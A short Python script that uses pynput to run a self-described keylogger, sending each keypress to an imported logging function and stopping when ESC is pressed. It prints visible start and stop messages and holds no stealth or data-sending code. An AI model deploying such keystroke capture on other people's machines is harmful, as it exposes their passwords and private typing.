from pynput import keyboard
from logger import key_pressed

def on_press(key):
    if key == keyboard.Key.esc:
        print("ESC pressed. Stopping keylogger.")
        return False
    key_pressed(key)

def main():
    """Start the keylogger."""
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
